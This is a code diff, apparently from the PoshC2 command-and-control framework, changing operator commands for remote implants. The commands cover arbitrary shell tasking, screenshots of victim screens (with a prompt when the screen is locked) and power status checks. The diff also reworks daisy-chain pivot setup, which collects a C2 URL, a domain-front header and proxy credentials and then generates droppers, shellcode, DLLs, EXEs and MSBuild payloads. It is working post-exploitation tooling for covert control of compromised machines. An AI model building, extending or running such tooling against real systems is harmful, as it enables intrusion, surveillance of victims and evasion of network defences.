+    new_task("get-variable -name rotate", user, randomuri)
+
+
 def do_shell(user, command, randomuri):
+    new_task(command, user, randomuri)
+
+
+def do_get_screenshotmulti(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+    new_task(command, user, randomuri)
+
+
+def do_get_screenshot(user, command, randomuri):
+    pwrStatus = get_powerstatusbyrandomuri(randomuri)
+    if (pwrStatus is not None and pwrStatus[7]):
+        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+        if ri.lower() == "n" or ri.lower() == "":
+            return
+    new_task(command, user, randomuri)
+
+
+def do_get_powerstatus(user, command, randomuri):
+    getpowerstatus(randomuri)
+
+
+def do_loadpowerstatus(user, command, randomuri):
+    update_label("PSM", randomuri)
     new_task(command, user, randomuri)
 
 
@@ -807,6 +685,7 @@ def do_startdaisy(user, command, randomuri):
     proxy_user = ""
     proxy_pass = ""
     proxy_url = ""
+    cred_expiry = ""
 
     if elevated.lower() == "n":
         cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
@@ -820,20 +699,25 @@ def do_startdaisy(user, command, randomuri):
 
     bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
     firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
+    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
+    default_df_header = get_first_dfheader(DomainFrontHeader)
+    if default_df_header == default_url:
+        default_df_header = None
     if firstdaisy.lower() == "y" or firstdaisy == "":
-        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {PayloadCommsHost}): " + Colours.END)
-        if DomainFrontHeader:
-            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {DomainFrontHeader}): " + Colours.END)
-        else:
-            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for configured value of no header): " + Colours.END)
+        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
+        domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
         proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
         proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
         proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
+        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")
 
         if not upstream_url:
-            upstream_url = PayloadCommsHost
+            upstream_url = default_url
         if not domain_front:
-            domain_front = DomainFrontHeader
+            if default_df_header:
+                domain_front = default_df_header
+            else:
+                domain_front = ""
 
     else:
         upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
@@ -875,16 +759,15 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], f"http://{bind_ip}", "", f"{bind_port}", "", "", "",
-                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
-        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
+        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID=urlId, PowerShellProxyCommand=proxynone)
+        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
+        newPayload.CreateDroppers(name)
         newPayload.CreateRaw(name)
         newPayload.CreateDlls(name)
         newPayload.CreateShellcode(name)
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
-        newPayload.CreateCS(name)
-        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
         print_good("Created new %s daisy payloads" % name)
 
 
